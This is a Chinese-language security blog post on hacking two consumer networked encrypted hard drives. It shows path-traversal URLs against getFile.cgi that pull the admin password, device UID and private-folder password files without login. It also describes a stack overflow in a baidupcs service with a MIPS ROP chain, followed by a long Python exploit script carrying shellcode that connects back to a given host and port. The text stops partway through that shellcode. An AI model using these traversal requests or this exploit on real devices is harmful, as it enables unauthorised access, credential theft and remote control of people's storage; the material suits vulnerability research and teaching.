<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="keywords" content="u 盘破解,移动硬盘破解,录音笔破解,智能硬盘破解,固态硬盘破解"><meta name="description" content="随着电子信息产业的高速发展，电子产品对于各类数据处理的技术愈加强大，为人们的工作与社交带来了许多便捷与乐趣的同时，人们的日常生活对各类电子设备的依赖也显而易见，但是，一旦保管不当，我们存储其中的各类数据也将存在着不同程度的安全隐患，因此，随着人们数据安全意识的提高，加密型的电子设备在我们生活中越来越常见。"><title>加密设备攻防(二）- 智能设备篇 | Yaseng</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/3.0.3/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/2.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/rss.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">加密设备攻防(二）- 智能设备篇</h1><a id="logo" href="/.">Yaseng</a><p class="description">Bypass the token</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/project/"><i class="fa fa-reorder"> Project</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/rss.xml"><i class="fa fa-rss"> Rss</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">加密设备攻防(二）- 智能设备篇</h1><div class="post-meta">Nov 11, 2020<span> | </span><span class="category"><a href="/categories/物联网安全/">物联网安全</a></span></div><div class="clear"><div id="toc" class="toc-article"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#某家存储网络硬盘的漏洞"><span class="toc-number">2.</span> <span class="toc-text">某家存储网络硬盘的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#设备与客户端通信"><span class="toc-number">2.1.</span> <span class="toc-text">设备与客户端通信</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#隐私空间漏洞"><span class="toc-number">2.2.</span> <span class="toc-text">隐私空间漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getFile-cgi-任意文件下载"><span class="toc-number">2.3.</span> <span class="toc-text">getFile.cgi 任意文件下载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#某智能加密硬盘的漏洞"><span class="toc-number">3.</span> <span class="toc-text">某智能加密硬盘的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击思路"><span class="toc-number">3.1.</span> <span class="toc-text">攻击思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第一步：硬盘的工作原理"><span class="toc-number">3.2.</span> <span class="toc-text">第一步：硬盘的工作原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二步：漏洞挖掘"><span class="toc-number">3.3.</span> <span class="toc-text">第二步：漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#定位溢出代码"><span class="toc-number">3.3.1.</span> <span class="toc-text">定位溢出代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第三步：漏洞利用"><span class="toc-number">3.4.</span> <span class="toc-text">第三步：漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#创建exploit"><span class="toc-number">3.4.1.</span> <span class="toc-text">创建exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第四步：文件加密分析"><span class="toc-number">3.5.</span> <span class="toc-text">第四步：文件加密分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#gdb-ida-动态调试"><span class="toc-number">3.5.1.</span> <span class="toc-text">gdb + ida 动态调试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解密成功"><span class="toc-number">3.6.</span> <span class="toc-text">解密成功</span></a></li></ol></li></ol></div></div><div class="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>智能设备的加密安全篇</p>
<h2 id="某家存储网络硬盘的漏洞"><a href="#某家存储网络硬盘的漏洞" class="headerlink" title="某家存储网络硬盘的漏洞"></a>某家存储网络硬盘的漏洞</h2><p>这是一款带网口的家庭存储硬盘，可以通过手机 app 进行远程管理。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201112151719742.png" alt="image-20201112151719742"></p>
<h3 id="设备与客户端通信"><a href="#设备与客户端通信" class="headerlink" title="设备与客户端通信"></a>设备与客户端通信</h3><p>这款硬盘使用 TUTK IOTC 平台进行 p2p 通信。接上网线后，只需要在客户端输入设备的 UID 和管理员设置的密码，就可以远程连接管理硬盘数据。TUTK IOTC平台的 p2p 建立连接后，设备向客户端发送数据的流程图如下，首先初始化 iotc 平台，随后创建 login 线程，监听客户端的连接，会话建立后，向客户端发送数据。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201112151918224.png" alt="image-20201112151918224"></p>
<p>而作为设备与客户端通信的进程为 p2pIotc，拖到 ida 中分析，sub_402E64 函数通过读取 /etc/config/tunnelid.dat 文件来得到设备的 UID，在函数 sub_402AF8 读取 /etc/web_pwd.txt 文件得到管理密码，用来用户登入验证。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201112155309242.png" alt="image-20201112155309242"></p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201112173527302.png" alt="image-20201112173527302"></p>
<h3 id="隐私空间漏洞"><a href="#隐私空间漏洞" class="headerlink" title="隐私空间漏洞"></a>隐私空间漏洞</h3><p>这款硬盘还设立了隐私空间，也就是加密文件夹，加密文件后将文件移动到加密目录下。当通过app客户端成功登录硬盘时，首先 fs_httpd 进程会读取配置文件“/etc/private_dir_pwd“中的保存隐私空间的密码，用于之后打开隐私空间作密码校验。但是通过在web客户端或网络文件夹登录时访问这个隐私空间时，却形同虚设，与普通文件夹无区别。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201112173615563.png" alt="image-20201112173615563"></p>
<h3 id="getFile-cgi-任意文件下载"><a href="#getFile-cgi-任意文件下载" class="headerlink" title="getFile.cgi 任意文件下载"></a>getFile.cgi 任意文件下载</h3><p>   在 /www/cgi-bin/get/ 目录下，其中有个 getFile.cgi 的 cgi 网关接口文件，在没有登入验证的情况下，内网中可直接下载硬盘的任意文件，代码如下</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201112173625634.png" alt="image-20201112173625634"></p>
<p>在同内网中，在web浏览器中访问设备：</p>
<p><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/config/tunnelid.dat" target="_blank" rel="noopener">http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/config/tunnelid.dat</a></p>
<p><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/web_pwd.txt" target="_blank" rel="noopener">http://192.168.8.177/</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/web_pwd.txt" target="_blank" rel="noopener">cgi</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/web_pwd.txt" target="_blank" rel="noopener">-bin/get/</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/web_pwd.txt" target="_blank" rel="noopener">getFile.cgi</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/web_pwd.txt" target="_blank" rel="noopener">?/../../../../../../../../../</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/web_pwd.txt" target="_blank" rel="noopener">etc</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/web_pwd.txt" target="_blank" rel="noopener">/</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../etc/web_pwd.txt" target="_blank" rel="noopener">web_pwd.txt</a></p>
<p><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../" target="_blank" rel="noopener">http://192.168.8.177/</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../" target="_blank" rel="noopener">cgi</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../" target="_blank" rel="noopener">-bin/get/</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../" target="_blank" rel="noopener">getFile.cgi</a><a href="http://192.168.8.177/cgi-bin/get/getFile.cgi?/../../../../../../../../../" target="_blank" rel="noopener">?/../../../../../../../../../</a>etc/private_dir_pwd</p>
<p>可直接下载配置文件 tunnelid.dat 、web_pwd.txt 和 private_dir_pwd ，用于远程登入。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201112173722295.png" alt="image-20201112173722295"></p>
<h2 id="某智能加密硬盘的漏洞"><a href="#某智能加密硬盘的漏洞" class="headerlink" title="某智能加密硬盘的漏洞"></a>某智能加密硬盘的漏洞</h2><p>这是一款可连接 wifi 且带网口的移动加密硬盘，手机可以通过 app 进行远程管理，还可以通过 app 单独设置密码加密隐私文件。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201112194124466.png" alt="image-20201112194124466"></p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201116141348745.png" alt="image-20201116141348745"></p>
<h3 id="第一步：硬盘的工作原理"><a href="#第一步：硬盘的工作原理" class="headerlink" title="第一步：硬盘的工作原理"></a>第一步：硬盘的工作原理</h3><p> 下载智能硬盘手机 app，登录 app 远程连接硬盘，通过路由器进行抓包，发现其由 80 端口与手机 app 通信。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113131858732.png" alt="image-20201113131858732"></p>
<p>通过串口调试进入 shell，运行 netstat 命令查看系统端口进程，其中 80 端口进程为 lighttpd。分析后找到其位于/etc/lighttpd/ 目录下的配置文件 lighttpd.conf，如图 3 可以看到其中 include 包含了当前 conf.d/ 目录下的 proxy.conf 文件。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113131941484.png" alt="image-20201113131941484"></p>
<p>将 proxy.conf 文件的代理服务整理如下：</p>
<table>
<thead>
<tr>
<th><strong>url</strong></th>
<th><strong>port</strong></th>
<th><strong>进程</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>protocol.csp</td>
<td>81</td>
<td>ioos</td>
<td>App  交互</td>
</tr>
<tr>
<td>system.csp</td>
<td>81</td>
<td>ioos</td>
<td>系统</td>
</tr>
<tr>
<td>netip.csp</td>
<td>81</td>
<td>ioos</td>
<td></td>
</tr>
<tr>
<td>sysfirm.csp</td>
<td>81</td>
<td>ioos</td>
<td></td>
</tr>
<tr>
<td>index.csp</td>
<td>81</td>
<td>ioos</td>
<td></td>
</tr>
<tr>
<td>dldlink.csp</td>
<td>81</td>
<td>ioos</td>
<td></td>
</tr>
<tr>
<td>error.csp</td>
<td>81</td>
<td>ioos</td>
<td></td>
</tr>
<tr>
<td>upload.csp</td>
<td>9082</td>
<td></td>
<td>上传</td>
</tr>
<tr>
<td>dlna.csp</td>
<td>8200</td>
<td>minidlna</td>
<td>DLNA共享</td>
</tr>
<tr>
<td>control.csp</td>
<td>8201</td>
<td>control</td>
<td>视频音频控制</td>
</tr>
<tr>
<td>dropbox.csp</td>
<td>8300</td>
<td></td>
<td>dropbox云存储</td>
</tr>
<tr>
<td>baidupcs.csp</td>
<td>8400</td>
<td>baidupcs</td>
<td>百度网盘</td>
</tr>
<tr>
<td>p2p.csp</td>
<td>8212</td>
<td></td>
<td>p2p远程通信</td>
</tr>
<tr>
<td>download.csp</td>
<td>82</td>
<td></td>
<td>下载</td>
</tr>
<tr>
<td>vpn.csp</td>
<td>8500</td>
<td></td>
<td>vpn</td>
</tr>
</tbody>
</table>
<h3 id="第二步：漏洞挖掘"><a href="#第二步：漏洞挖掘" class="headerlink" title="第二步：漏洞挖掘"></a>第二步：漏洞挖掘</h3><p>将 baidupcs（百度网盘）作为测试目标，使用fuzz测试登录网盘发现了 crash。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113132045448.png" alt="image-20201113132045448"></p>
<p>baidupcs 进程打印出如下信息，最终出现了 Segmentation fault 错误</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113132134803.png" alt="image-20201113132134803"></p>
<p>​    </p>
<h4 id="定位溢出代码"><a href="#定位溢出代码" class="headerlink" title="定位溢出代码"></a>定位溢出代码</h4><p>打开 ida，搜索上面打印的调试信息的关键字，如 getvaluefrom_url。</p>
<p>关键代码 sub_43B230 如下，0x43b5dc 处调用 get_value_from_url 函数获取 username 的值时，由于缓冲区只有 1028 字节， 在对长度未进行检查的情况下，将获取username值直接放入缓存区造成溢出。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113132147198.png" alt="image-20201113132147198"></p>
<h3 id="第三步：漏洞利用"><a href="#第三步：漏洞利用" class="headerlink" title="第三步：漏洞利用"></a>第三步：漏洞利用</h3><p>我们需要跳转到堆栈中执行 shellcode，结合 mipsrop ida 插件，现在开始构造 rop</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113133935336.png" alt="image-20201113133935336"></p>
<p><strong>先修改寄存器的值</strong></p>
<p>mipsrop.find(“lw $ra, “) 修改寄存器</p>
<p>​                               </p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134106752.png" alt="image-20201113134106752"></p>
<p><strong>找到 sleep 函数的参数</strong></p>
<p>mipsrop.find(“li $a0,1”) 作为 sleep 的参数 $a0 赋值，其中 $s4 做为下一个 gadget 的地址</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134112602.png" alt="image-20201113134112602"></p>
<p><strong>调用 sleep 函数</strong></p>
<p>接着调用 sleep 函数刷新缓存，并在返回后执行下一个 gadget （$ra）。使用 mipsrop.tail()，准备跳转 $s1 为 sleep 的地址，这里填充 ra 寄存器，地址 0x1E8AC 执行 0x28 + var_4($sp) 是将执行后 sleep 返回的地址。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134118925.png" alt="image-20201113134118925"></p>
<p><strong>运行 shellcode</strong></p>
<p>使用 mipsrop.stackfinder() 将 shellcode 的地址放入寄存器 s0</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134123337.png" alt="image-20201113134123337"></p>
<p>mipsrop.find(“move $t9,$s0”) 跳转到 s0 去执行</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134128377.png" alt="image-20201113134128377"></p>
<h4 id="创建exploit"><a href="#创建exploit" class="headerlink" title="创建exploit"></a>创建exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> urllib, urllib2, httplib</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MIPSPayload</span>:</span></span><br><span class="line">    BADBYTES = [<span class="number">0x00</span>]</span><br><span class="line">    LITTLE = <span class="string">"little"</span></span><br><span class="line">    BIG = <span class="string">"big"</span></span><br><span class="line">    FILLER = <span class="string">"A"</span></span><br><span class="line">    BYTES = <span class="number">4</span></span><br><span class="line">    NOP = <span class="string">"\x27\xE0\xFF\xFF"</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, libase=<span class="number">0</span>, endianess=LITTLE, badbytes=BADBYTES)</span>:</span></span><br><span class="line">        self.libase = libase</span><br><span class="line">        self.shellcode = <span class="string">""</span></span><br><span class="line">        self.endianess = endianess</span><br><span class="line">        self.badbytes = badbytes</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        self.shellcode += data</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Address</span><span class="params">(self, offset, base=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> base <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            base = self.libase</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> self.ToString(base + offset)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AddAddress</span><span class="params">(self, offset, base=None)</span>:</span></span><br><span class="line">        self.Add(self.Address(offset, base))</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AddBuffer</span><span class="params">(self, size, byte=FILLER)</span>:</span></span><br><span class="line">        self.Add(byte * size)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">AddNops</span><span class="params">(self, size)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.endianess == self.LITTLE:</span><br><span class="line">            self.Add(self.NOP[::<span class="number">-1</span>] * size)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.Add(self.NOP * size)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ToString</span><span class="params">(self, value, size=BYTES)</span>:</span></span><br><span class="line">        data = <span class="string">""</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, size):</span><br><span class="line">            data += chr((value &gt;&gt; (<span class="number">8</span>*i)) &amp; <span class="number">0xFF</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> self.endianess != self.LITTLE:</span><br><span class="line">            data = data[::<span class="number">-1</span>]</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Build</span><span class="params">(self)</span>:</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> self.shellcode:</span><br><span class="line">            <span class="keyword">for</span> byte <span class="keyword">in</span> self.badbytes:</span><br><span class="line">                <span class="keyword">if</span> c == chr(byte):</span><br><span class="line">                    <span class="keyword">raise</span> Exception(<span class="string">"Bad byte found in shellcode at offset %d: 0x%.2X"</span> % (count, byte))</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> self.shellcode</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Print</span><span class="params">(self, bpl=BYTES)</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> self.shellcode:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">""</span></span><br><span class="line">                i = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">            sys.stdout.write(<span class="string">"\\x%.2X"</span> % ord(c))</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> bpl &gt; <span class="number">0</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTP</span>:</span></span><br><span class="line"> </span><br><span class="line">    HTTP = <span class="string">"http"</span></span><br><span class="line">    HTTPS = <span class="string">"https"</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, proto=HTTP, verbose=False)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.proto = proto</span><br><span class="line">        self.verbose = verbose</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Encode</span><span class="params">(self, string)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> urllib.quote_plus(string)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Send</span><span class="params">(self, uri, headers=&#123;&#125;, data=None, response=False)</span>:</span></span><br><span class="line">        html = <span class="string">""</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> uri.startswith(<span class="string">'/'</span>):</span><br><span class="line">            c = <span class="string">''</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c = <span class="string">'/'</span></span><br><span class="line"> </span><br><span class="line">        url = <span class="string">'%s://%s%s%s'</span> % (self.proto, self.host, c, uri)</span><br><span class="line">        <span class="keyword">if</span> self.verbose:</span><br><span class="line">            <span class="keyword">print</span> url</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            data = urllib.urlencode(data)</span><br><span class="line"> </span><br><span class="line">        url = url + data</span><br><span class="line">        req = urllib2.Request(url, data, headers)</span><br><span class="line">        <span class="comment"># print url</span></span><br><span class="line">        rsp = urllib2.urlopen(req)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> response:</span><br><span class="line">            html = rsp.read()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makepayload</span><span class="params">(host,port)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] prepare shellcode'</span>,</span><br><span class="line">    hosts = struct.unpack(<span class="string">'&lt;cccc'</span>,struct.pack(<span class="string">'&lt;L'</span>,host))</span><br><span class="line">    ports = struct.unpack(<span class="string">'&lt;cccc'</span>,struct.pack(<span class="string">'&lt;L'</span>,port))</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#print hosts,ports</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># sys_socket</span></span><br><span class="line">    <span class="comment"># a0: domain</span></span><br><span class="line">    <span class="comment"># a1: type</span></span><br><span class="line">    <span class="comment"># a2: protocol</span></span><br><span class="line">    mipselshell =<span class="string">"\xfa\xff\x0f\x24"</span>   <span class="comment"># li t7,-6</span></span><br><span class="line">    mipselshell+=<span class="string">"\x27\x78\xe0\x01"</span>   <span class="comment"># nor t7,t7,zero</span></span><br><span class="line">    mipselshell+=<span class="string">"\xfd\xff\xe4\x21"</span>   <span class="comment"># addi a0,t7,-3</span></span><br><span class="line">    mipselshell+=<span class="string">"\xfd\xff\xe5\x21"</span>   <span class="comment"># addi a1,t7,-3</span></span><br><span class="line">    mipselshell+=<span 